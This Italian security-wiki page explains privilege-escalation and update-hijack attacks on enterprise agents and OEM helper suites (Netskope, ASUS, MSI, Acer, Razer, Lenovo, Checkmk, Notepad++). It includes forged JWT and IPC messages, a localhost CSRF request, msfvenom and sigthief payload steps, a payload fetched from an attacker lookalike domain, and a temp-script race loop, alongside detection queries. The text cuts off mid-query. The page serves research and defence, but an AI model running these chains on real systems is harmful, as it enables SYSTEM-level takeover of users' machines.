# Abuso degli auto-updater aziendali e dell’IPC con privilegi elevati (ad es., Netskope, ASUS e MSI)

{{#include ../../banners/hacktricks-training.md}}

Questa pagina generalizza una classe di catene di escalation dei privilegi locali di Windows individuate negli agenti endpoint e negli updater aziendali, che espongono una superficie IPC facilmente accessibile e un flusso di aggiornamento privilegiato. Un esempio rappresentativo è Netskope Client per Windows < R129 (CVE-2025-0309), in cui un utente con privilegi limitati può forzare la registrazione presso un server controllato dall’attaccante e poi fornire un MSI malevolo, installato dal servizio SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Idee chiave riutilizzabili con prodotti simili:
- Abusare dell’IPC su localhost di un servizio privilegiato per forzare una nuova registrazione o riconfigurazione verso un server dell’attaccante.
- Implementare gli endpoint di aggiornamento del vendor, fornire una Trusted Root CA fraudolenta e indirizzare l’updater verso un pacchetto malevolo “firmato”.
- Eludere controlli deboli del firmatario (liste consentite CN), flag digest facoltativi e proprietà MSI permissive.
- Se l’IPC è “crittografato”, derivare la chiave/IV da identificatori della macchina leggibili da tutti e memorizzati nel registro.
- Se il servizio limita i chiamanti in base al percorso dell’immagine o al nome del processo, effettuare l’injection in un processo consentito oppure avviarne uno in stato sospeso e inizializzare la propria DLL con una modifica minima al contesto del thread.

Anche i servizi TCP locali personalizzati richiedono lo stesso esame dell’identità e dei confini degli input, anche quando richiedono un PIN o altre credenziali applicative. Identifica il processo associato al listener e l’account di servizio effettivo, quindi esamina il binario/la versione esatti distribuiti e verifica se i campi controllati dal chiamante vengono sottoposti a controlli di lunghezza prima di essere copiati in buffer a dimensione fissa o usati per costruire il comando di un processo figlio. Le [indicazioni di Microsoft sulla sovrascrittura del buffer](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) spiegano perché gli input esterni non verificati sono pericolosi nel codice nativo privilegiato. Un listener loopback, una credenziale hardcoded o il solo nome di un processo non dimostrano che vi siano corruzione della memoria o esecuzione come SYSTEM: raggiungibilità, autorizzazione, percorso del codice e mitigazioni restano condizioni distinte. Mantieni passiva la normale enumerazione, anziché inviare a un servizio attivo input lunghi abbastanza da causarne il crash.

---
## 1) Forzare la registrazione presso un server dell’attaccante tramite IPC su localhost

Molti agent includono un processo UI in user mode che comunica tramite JSON con un servizio SYSTEM su TCP localhost.

Osservato in Netskope:
- UI: stAgentUI (integrità bassa) ↔ Servizio: stAgentSvc (SYSTEM)
- ID comando IPC 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flusso dell’exploit:
1) Crea un token di registrazione JWT con claim che controllano l’host backend (ad es., AddonUrl). Usa alg=None, così non è necessaria alcuna firma.
2) Invia il messaggio IPC che richiama il comando di provisioning con il tuo JWT e il nome del tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Il servizio inizia a contattare il tuo server malevolo per l’enrollment/configurazione, ad esempio:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Note:
- Se la verifica del chiamante si basa sul percorso/nome, origina la richiesta da un binario del vendor inserito nella allow-list (vedi §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Hijacking del canale di aggiornamento per eseguire codice come SYSTEM

Una volta che il client comunica con il tuo server, implementa gli endpoint previsti e indirizzalo a un MSI controllato dall’attaccante. Sequenza tipica:

1) /v2/config/org/clientconfig → Restituisci una configurazione JSON con un intervallo di aggiornamento molto breve, ad esempio:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Restituisce un certificato CA PEM. Il servizio lo installa nell'archivio Trusted Root del Local Machine.
3) /v2/checkupdate → Fornisci metadati che puntano a un MSI malevolo e a una versione falsa.

Bypass dei controlli comuni riscontrati in ambienti reali:
- Allow-list del CN del signer: il servizio potrebbe limitarsi a verificare che il Subject CN sia uguale a “netSkope Inc” o “Netskope, Inc.”. La tua rogue CA può emettere un certificato leaf con quel CN e firmare l'MSI.
- Proprietà CERT_DIGEST: includi una proprietà MSI innocua chiamata CERT_DIGEST. Nessuna verifica in fase di installazione.
- Verifica digest facoltativa: un flag di configurazione (ad es. check_msi_digest=false) disabilita ulteriori controlli crittografici.

Risultato: il servizio SYSTEM installa il tuo MSI da
C:\ProgramData\Netskope\stAgent\data\*.msi
ed esegue codice arbitrario come NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Lezione sul bypass delle patch: se un vendor risponde aggiungendo una piccola serie di domini “trusted” a un'allow-list invece di autenticare crittograficamente la sorgente degli aggiornamenti, cerca redirector o reverse proxy di proprietà del vendor che consentano ancora di reindirizzare il traffico. Nel caso di Netskope, ricerche pubbliche successive hanno mostrato che un'allow-list dell'era R129 poteva ancora essere aggirata tramite `rproxy.goskope.com`, che fungeva da proxy per contenuti Azure App Service controllati dall'attaccante. Considera le allow-list degli hostname come un rallentamento, non come un confine di fiducia.<sup>[[14]](#references)</sup>

---
## 3) Forging di richieste IPC encrypted (quando presente)

Da R127, Netskope ha racchiuso il JSON IPC in un campo encryptData che sembra Base64. Il reverse engineering ha rivelato l'uso di AES, con chiave/IV derivati da valori del registry leggibili da qualsiasi utente:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Gli attacker possono riprodurre la cifratura e inviare comandi encrypted validi da un utente standard.<sup>[[1]](#references)[[2]](#references)</sup> Suggerimento generale: se un agent inizia improvvisamente a “cifrare” il proprio IPC, cerca device ID, product GUID e install ID sotto HKLM da usare come materiale.

---
## 4) Bypass delle allow-list dei chiamanti IPC (controlli su path/nome)

Alcuni servizi cercano di autenticare il peer risolvendo il PID della connessione TCP e confrontando il path/nome dell'immagine con i binari del vendor presenti nell'allow-list e collocati sotto Program Files (ad es., stagentui.exe, bwansvc.exe, epdlp.exe).

Due bypass pratici:
- DLL injection in un processo presente nell'allow-list (ad es., nsdiag.exe) e inoltro dell'IPC dall'interno del processo.
- Avvia un binario presente nell'allow-list in stato sospeso e inizializza la tua proxy DLL senza CreateRemoteThread (vedi §5), rispettando così le regole anti-tamper applicate dal driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection compatibile con la protezione anti-tamper: processo sospeso + patch di NtContinue

Spesso i prodotti includono un driver minifilter/OB callbacks (ad es., Stadrv) per rimuovere i diritti pericolosi dagli handle ai processi protetti:
- Processo: rimuove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: limita i diritti a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader user-mode affidabile che rispetta questi vincoli:
1) Crea un processo con CreateProcess di un binario del vendor e CREATE_SUSPENDED.
2) Ottieni gli handle ancora consentiti: PROCESS_VM_WRITE | PROCESS_VM_OPERATION sul processo e un handle del thread con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oppure solo THREAD_RESUME se applichi la patch al codice in un RIP noto).
3) Sovrascrivi ntdll!NtContinue (o un altro thunk iniziale sicuramente mappato) con uno stub minimo che chiama LoadLibraryW sul path della tua DLL, poi torna al codice originale.
4) Chiama ResumeThread per eseguire lo stub nel processo e caricare la tua DLL.

Poiché non hai usato PROCESS_CREATE_THREAD o PROCESS_SUSPEND_RESUME su un processo già protetto (lo hai creato tu), la policy del driver viene rispettata.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Strumenti pratici
- NachoVPN (plugin Netskope) automatizza una rogue CA, la firma di un MSI malevolo e serve gli endpoint necessari: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope è un client IPC personalizzato che crea messaggi IPC arbitrari (eventualmente AES-encrypted) e include l'injection di un processo sospeso per inviare richieste da un binario presente nell'allow-list.<sup>[[4]](#references)</sup>

## 7) Workflow rapido di triage per superfici updater/IPC sconosciute

Quando ti trovi davanti a un nuovo endpoint agent o a una suite di “helper” per motherboard, di solito basta un workflow rapido per capire se hai davanti un promettente target di privesc:<sup>[[6]](#references)</sup>

1) Elenca i listener loopback e risali ai processi del vendor corrispondenti:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Enumera le named pipe candidate:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Estrai i dati di routing memorizzati nel registro e usati dai server IPC basati su plugin:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Estrai prima i nomi degli endpoint, le chiavi JSON e gli ID dei comandi dal client in user-mode. I frontend Electron/.NET impacchettati spesso fanno leak dell'intero schema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Individua il criterio di fiducia effettivo, non solo il percorso del codice che alla fine avvia il processo:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Pattern da prioritizzare:
- `CryptQueryObject`/parsing dei certificati senza `WinVerifyTrust` di solito significa che «il certificato esiste» è stato trattato come «il certificato è attendibile», consentendo il cloning dei certificati o altri trucchi con fake signer.
- I controlli su sottostringhe/suffissi di `Origin`, `Referer`, URL di download, nomi di processo o CN del signer non sono autenticazione. `contains(".vendor.com")` è spesso sfruttabile con domini lookalike controllati dall’attaccante.
- Se la GUI con privilegi bassi decide che «il file è attendibile» e il broker SYSTEM si limita a usare quel risultato, patchare o reimplementare la DLL/JS lato client spesso consente di aggirare completamente il confine di sicurezza (validazione divisa in stile Razer).
- Se il broker copia un payload in `%TEMP%`/`C:\Windows\Temp` e poi lo valida o lo pianifica da quel percorso, verifica subito la presenza di finestre di sostituzione TOCTOU e di moduli plugin fratelli che espongono wrapper alternativi `ExecuteTask()` con controlli più deboli.<sup>[[6]](#references)</sup>

Per i target che fanno ampio uso di named pipe, PipeViewer è un modo rapido per individuare DACL deboli e pipe raggiungibili da remoto prima di iniziare a fare reverse engineering approfondito del protocollo.<sup>[[11]](#references)</sup>

Se il target autentica i chiamanti solo tramite PID, percorso dell’immagine o nome del processo, considera questo un ostacolo minore, non un confine di sicurezza: spesso è sufficiente iniettare codice nel client legittimo o effettuare la connessione da un processo autorizzato. Per le named pipe in particolare, [questa pagina sull’impersonificazione del client e l’abuso delle pipe](named-pipe-client-impersonation.md) approfondisce questa primitiva.

Per un **broker di cleanup o ripristino** privilegiato, esamina il confine di attendibilità dei percorsi oltre all’ACL della pipe. Un chiamante con privilegi inferiori potrebbe essere in grado di selezionare una destinazione di ripristino o rinominare un backup preparato in una directory condivisa, anche quando l’eseguibile del servizio e la relativa directory di installazione sono protetti. Verifica separatamente che il chiamante possa raggiungere il comando di ripristino, modificare l’input preparato o il nome file specifico, che il broker venga eseguito con un’identità più privilegiata e che l’operazione di ripristino scriva effettivamente nel percorso protetto selezionato. Una directory di staging scrivibile o una pipe leggibile, da sole, non dimostrano la possibilità di effettuare una scrittura arbitraria privilegiata; la mappatura della destinazione e il comportamento del servizio richiedono una revisione del codice o test controllati. Non eseguire un comando di cleanup sconosciuto durante l’enumerazione passiva, perché potrebbe eliminare file dell’utente.

---
## 8) Broker di add-in modulari autenticati solo tramite firme del vendor (schema Lenovo Vantage)

Una variante più recente da cercare è il **broker RPC con client firmato**: un processo desktop Lenovo con privilegi bassi comunica con un servizio SYSTEM, e il servizio instrada comandi JSON verso una serie di add-in descritti in XML in `%ProgramData%`. Una volta ottenuta l’esecuzione di codice **all’interno di un qualsiasi client firmato accettato**, ogni contratto `runas="system"` entra a far parte della superficie di attacco.<sup>[[15]](#references)</sup>

Primitive di alto valore osservate nelle ricerche su Lenovo Vantage:
- **Fidarsi del chiamante perché firmato dal vendor**: i ricercatori hanno raggiunto un contesto autenticato copiando un EXE firmato da Lenovo in una directory scrivibile e soddisfacendo un DLL side-load (`profapi.dll`), in modo da eseguire codice arbitrario all’interno di un client già considerato attendibile dal servizio.
- **Individuazione della superficie di attacco tramite manifest**: gli add-in sono dichiarati in `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; diversi contratti vengono eseguiti come `SYSTEM`, quindi enumerare questi manifest spesso rivela le vere operazioni privilegiate più rapidamente del reverse engineering del broker stesso.
- **Bug per singolo comando dietro il canale autenticato**: una volta all’interno del client attendibile, le ricerche pubbliche hanno individuato path traversal e race condition nei comandi di aggiornamento/installazione, abuso di SQL raw nei database privilegiati delle impostazioni e controlli dei percorsi del registro basati su sottostringhe, che consentivano scritture al di fuori dell’hive previsto.

Ricognizione utile su un target:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Indicazione pratica: ogni volta che una suite di helper espone un broker che autentica prima il **processo chiamante** e solo dopo inoltra le richieste a decine di comandi di plugin/add-in, non fermarti dopo aver aggirato il controllo di fiducia iniziale. Estrai la tabella manifest/contract e fai fuzzing su ogni verbo ad alto privilegio in modo indipendente; il canale autenticato nasconde di solito diversi bug di secondo livello.

---
## 1) CSRF dal browser a localhost contro API HTTP privilegiate (ASUS DriverHub)

DriverHub include un servizio HTTP in modalità utente (ADU.exe) su 127.0.0.1:53000, che si aspetta chiamate dal browser provenienti da https://driverhub.asus.com. Il filtro dell’origine esegue semplicemente `string_contains(".asus.com")` sull’header Origin e sugli URL di download esposti da `/asus/v1.0/*`. Qualsiasi host controllato dall’attaccante, ad esempio `https://driverhub.asus.com.attacker.tld`, supera quindi il controllo e può inviare richieste che modificano lo stato tramite JavaScript.<sup>[[6]](#references)</sup> Consulta [le basi del CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) per ulteriori schemi di bypass.

Flusso pratico:
1) Registra un dominio che contenga `.asus.com` e ospita lì una pagina web malevola.
2) Usa `fetch` o XHR per chiamare un endpoint privilegiato (ad es. `Reboot`, `UpdateApp`) su `http://127.0.0.1:53000`.
3) Invia il corpo JSON atteso dall’handler: il codice JS compresso del frontend mostra lo schema qui sotto.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Anche la CLI di PowerShell mostrata di seguito funziona quando l'header Origin viene falsificato impostandolo sul valore attendibile:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Qualsiasi visita del browser al sito dell’attaccante diventa quindi un CSRF locale con 1 clic (o 0 clic tramite `onload`) che attiva un helper SYSTEM.

---
## 2) Verifica insicura della firma del codice e clonazione del certificato (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` scarica eseguibili arbitrari definiti nel corpo JSON e li memorizza nella cache in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La convalida dell’URL di download riutilizza la stessa logica basata su sottostringhe, quindi `http://updates.asus.com.attacker.tld:8000/payload.exe` viene accettato. Dopo il download, ADU.exe verifica soltanto che il PE contenga una firma e che la stringa Subject corrisponda ad ASUS, prima di eseguirlo: non usa `WinVerifyTrust` né convalida la catena.

Per sfruttare il flusso:
1) Crea un payload (ad es., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona il signer di ASUS nel payload (ad es., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Ospita `pwn.exe` su un dominio simile a `.asus.com` e attiva UpdateApp tramite il CSRF del browser descritto sopra.

Poiché sia i filtri Origin che URL sono basati su sottostringhe e il controllo del signer confronta solo stringhe, DriverHub scarica ed esegue il binario dell’attaccante con i suoi privilegi elevati.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU nei percorsi di copia/esecuzione dell’updater (MSI Center CMD_AutoUpdateSDK)

Il servizio SYSTEM di MSI Center espone un protocollo TCP in cui ogni frame è composto da `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Il componente principale (Component ID `0f 27 00 00`) include `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Il relativo handler:
1) Copia l’eseguibile fornito in `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la firma tramite `CS_CommonAPI.EX_CA::Verify` (il subject del certificato deve essere “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve riuscire).
3) Crea un’attività pianificata che esegue il file temporaneo come SYSTEM con argomenti controllati dall’attaccante.

Il file copiato non viene bloccato tra la verifica e `ExecuteTask()`. Un attaccante può:
- Inviare il Frame A indicando un binario firmato da MSI legittimo (garantisce che il controllo della firma venga superato e che l’attività venga accodata).
- Creare una race con messaggi Frame B ripetuti che indicano un payload malevolo, sovrascrivendo `MSI Center SDK.exe` subito dopo il completamento della verifica.

Quando l’Utilità di pianificazione avvia l’attività, esegue il payload sovrascritto come SYSTEM, nonostante sia stato convalidato il file originale. Uno sfruttamento affidabile usa due goroutine/thread che inviano ripetutamente CMD_AutoUpdateSDK finché non vincono la finestra TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Abuso dell’IPC personalizzato a livello SYSTEM e dell’impersonificazione (MSI Center + Acer Control Centre)

### Set di comandi TCP di MSI Center
- Ogni plugin/DLL caricato da `MSI.CentralServer.exe` riceve un Component ID memorizzato in `HKLM\SOFTWARE\MSI\MSI_CentralServer`. I primi 4 byte di un frame selezionano il componente, consentendo agli attaccanti di instradare comandi verso moduli arbitrari.
- I plugin possono definire i propri task runner. `Support\API_Support.dll` espone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chiama direttamente `API_Support.EX_Task::ExecuteTask()` **senza convalidare la firma**: qualsiasi utente locale può indicargli `C:\Users\<user>\Desktop\payload.exe` e ottenere in modo deterministico l’esecuzione come SYSTEM.
- Intercettare il traffico loopback con Wireshark o strumentare i binari .NET in dnSpy consente di individuare rapidamente la mappatura Component ↔ command; quindi è possibile riprodurre i frame usando client personalizzati in Go/Python.<sup>[[6]](#references)</sup>

### Named pipe di Acer Control Centre e livelli di impersonificazione
- `ACCSvc.exe` (SYSTEM) espone `\\.\pipe\treadstone_service_LightMode` e la sua ACL discrezionale consente l’accesso a client remoti (ad es., `\\TARGET\pipe\treadstone_service_LightMode`). L’invio dell’ID comando `7` con un percorso file richiama la routine del servizio che avvia i processi.
- La libreria client serializza un byte terminatore speciale (113) insieme agli argomenti. La strumentazione dinamica con Frida/`TsDotNetLib` (vedi [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) per suggerimenti sulla strumentazione) mostra che l’handler nativo associa questo valore a un `SECURITY_IMPERSONATION_LEVEL` e a un SID di integrità prima di chiamare `CreateProcessAsUser`.
- Sostituendo 113 (`0x71`) con 114 (`0x72`) si passa al ramo generico che mantiene il token SYSTEM completo e imposta un SID di integrità elevata (`S-1-16-12288`). Il binario avviato viene quindi eseguito come SYSTEM senza restrizioni, sia localmente che tra computer.
- Insieme al flag dell’installer esposto (`Setup.exe -nocheck`), è possibile installare ACC anche su VM di laboratorio e provare la pipe senza hardware del produttore.<sup>[[6]](#references)</sup>

Questi bug IPC evidenziano perché i servizi localhost devono imporre l’autenticazione reciproca (SID ALPC, filtri `ImpersonationLevel=Impersonation`, filtraggio dei token) e perché l’helper “esegui binario arbitrario” di ogni modulo deve applicare le stesse verifiche del signer.

---
## 3) Helper COM/IPC “elevator” con convalida debole in user mode (Razer Synapse 4)

Razer Synapse 4 ha introdotto un altro pattern utile di questa famiglia: un utente con privilegi ridotti può chiedere a un helper COM di avviare un processo tramite `RzUtility.Elevator`, mentre la decisione di attendibilità è delegata a una DLL in user mode (`simple_service.dll`) anziché essere applicata in modo robusto all’interno del confine privilegiato.

Percorso di sfruttamento osservato:
- Istanziare l’oggetto COM `RzUtility.Elevator`.
- Chiamare `LaunchProcessNoWait(<path>, "", 1)` per richiedere l’avvio con privilegi elevati.
- Nel PoC pubblico, il controllo della firma PE in `simple_service.dll` viene rimosso con una patch prima di inviare la richiesta, consentendo l’avvio di un eseguibile arbitrario scelto dall’attaccante.<sup>[[6]](#references)[[10]](#references)</sup>

Invocazione minima in PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Considerazione generale: quando si fanno analisi inverse delle suite “helper”, non fermarsi a TCP localhost o alle named pipe. Verificare la presenza di classi COM con nomi come `Elevator`, `Launcher`, `Updater` o `Utility`, quindi controllare se il servizio privilegiato convalida effettivamente il binario di destinazione o si limita a fidarsi di un risultato calcolato da una DLL client in user mode modificabile. Questo schema è generalizzabile oltre Razer: qualsiasi architettura suddivisa in cui il broker con privilegi elevati utilizza una decisione allow/deny proveniente dal lato con privilegi bassi è una potenziale superficie di privesc.


---
## Esecuzione prevedibile di script temporanei durante la riparazione MSI (Checkmk Agent / CVE-2024-0670)

Alcuni agent Windows implementano ancora azioni privilegiate scrivendo un file `.cmd` temporaneo in `C:\Windows\Temp` ed eseguendolo come `SYSTEM`. Se il nome del file è prevedibile e il servizio non ricrea in modo sicuro i file esistenti, un utente con privilegi bassi può precreare il futuro file temporaneo impostandolo come **sola lettura** e indurre il processo privilegiato a eseguire contenuto controllato dall'attaccante anziché il proprio script.

Osservato nelle build vulnerabili di Checkmk Agent:
- schema del file temporaneo: `cmk_all_<PID>_1.cmd`
- rami interessati: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: **riparazione** MSI del pacchetto dell'agent memorizzato nella cache<sup>[[8]](#references)[[9]](#references)</sup>

Procedura pratica:
1. Stimare un intervallo realistico di PID partendo dagli ID dei processi attuali o dal PID dell'agent in esecuzione.
2. Scrivere un payload `.cmd` breve in **ASCII** (`Set-Content -Encoding Ascii` o redirezione da `cmd.exe`; evitare l'output PowerShell in UTF-16 per i file batch).
3. Creare in serie i file `C:\Windows\Temp\cmk_all_<PID>_1.cmd` nell'intervallo candidato e impostarli come sola lettura.
4. Avviare una riparazione dell'MSI memorizzato nella cache, in modo che il servizio privilegiato tenti di rigenerare lo script temporaneo e poi lo esegua.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Se il prodotto vulnerabile è installato tramite Windows Installer, individua il nome del prodotto corrispondente al file MSI memorizzato nella cache dall'aspetto casuale in `C:\Windows\Installer` prima di avviare la riparazione:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Note operative:
- `qwinsta` è utile quando `msiexec /fa` non riesce da una shell WinRM non interattiva e occorre capire se una sessione desktop esistente o disconnessa può attivare correttamente la riparazione.<sup>[[7]](#references)</sup>
- Questo schema si applica anche ad altri agenti endpoint e updater che **preparano script temporanei in percorsi scrivibili da tutti e in seguito li eseguono come SYSTEM**. Verifica la presenza di nomi prevedibili, l'assenza di semantiche di creazione esclusiva e la possibilità di attivare su richiesta i flussi di riparazione/aggiornamento.

### Riparazione interattiva dell'installer e console con privilegi

PDF24 Creator 11.15.1 illustra un rischio distinto legato alla riparazione MSI: la sua custom action di installazione della stampante può avviare una console visibile con diritti SYSTEM durante la riparazione. Il vendor ha modificato l'installer MSI nella versione 11.15.2 per correggere questo comportamento. Una versione precedente del prodotto è solo un'indicazione per il triage. Verifica il pacchetto MSI registrato o raggiungibile, se l'utente può avviare la riparazione, se sono presenti la custom action vulnerabile e il ritardo del file di log, e se un desktop interattivo può mostrare la console. Il ritardo segnalato usava un oplock su `faxPrnInst.log`; la normale possibilità di scrivere nel file non è l'unica condizione di accesso. Una shell non interattiva, un pacchetto inaccessibile o un installer patchato possono interrompere la catena. Questo problema non dipende da `AlwaysInstallElevated` ed è diverso dalla sostituzione di uno script temporaneo con nome prevedibile.

---
## Hijack remoto della supply chain tramite convalida debole dell'updater (WinGUp / Notepad++)

Tra giugno 2025 e dicembre 2025, gli attaccanti che avevano compromesso l'infrastruttura di hosting alla base del flusso di aggiornamento di Notepad++ hanno distribuito selettivamente manifest malevoli a vittime mirate. Gli updater più vecchi basati su WinGUp non verificavano completamente l'autenticità degli aggiornamenti, quindi una risposta XML malevola poteva reindirizzare i client verso URL controllati dagli attaccanti. Poiché il client accettava contenuti HTTPS senza verificare sia una catena di certificati attendibile sia una firma PE valida sull'installer scaricato, le vittime scaricavano ed eseguivano un `update.exe` NSIS trojanizzato.<sup>[[12]](#references)[[13]](#references)</sup>

Flusso operativo (non è richiesto alcun exploit locale):
1. **Intercettazione dell'infrastruttura**: compromettere CDN/hosting e rispondere ai controlli degli aggiornamenti con metadati controllati dagli attaccanti che indicano un URL di download malevolo.
2. **NSIS trojanizzato**: l'installer scarica/esegue un payload e sfrutta due catene di esecuzione:
   - **Bring-your-own signed binary + sideload**: includere il file firmato Bitdefender `BluetoothService.exe` e inserire una `log.dll` malevola nel suo percorso di ricerca. Quando viene eseguito il file binario firmato, Windows carica in sideload `log.dll`, che decritta e carica in modo riflessivo la backdoor Chrysalis (protetta da Warbird + hashing delle API per ostacolare il rilevamento statico).
   - **Iniezione di shellcode tramite script**: NSIS esegue uno script Lua compilato che usa API Win32 (ad es. `EnumWindowStationsW`) per iniettare shellcode e predisporre Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Indicazioni per hardening/rilevamento per qualsiasi auto-updater:
- Imporre la **verifica del certificato e della firma** dell'installer scaricato (fissare il signer del vendor, rifiutare CN/catene non corrispondenti) e firmare il manifest di aggiornamento stesso (ad es. XMLDSig). Bloccare i reindirizzamenti controllati dal manifest se non sono convalidati.
- Considerare il **sideload di file binari firmati BYO** come un punto di osservazione post-download: generare un alert quando un EXE firmato di un vendor carica una DLL con un nome proveniente da un percorso diverso da quello canonico di installazione (ad es. Bitdefender che carica `log.dll` da Temp/Downloads) e quando un updater deposita/esegue installer da temp con firme non appartenenti al vendor.
- Monitorare gli **artefatti specifici del malware** osservati in questa catena (utili come punti di correlazione generici): mutex `Global\Jdhfv_1.0.1`, scritture anomale di `gup.exe` in `%TEMP%` e fasi di iniezione di shellcode avviate tramite Lua.
- Notepad++ ha risposto rafforzando WinGUp nella versione v8.8.9 e successive: l'XML restituito è ora firmato (XMLDSig) e le build più recenti impongono la verifica del certificato e della firma dell'installer scaricato, anziché fidarsi solo del trasporto.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Sideload di <code>log.dll</code> da EXE firmato Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> che avvia un programma di installazione non relativo a Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
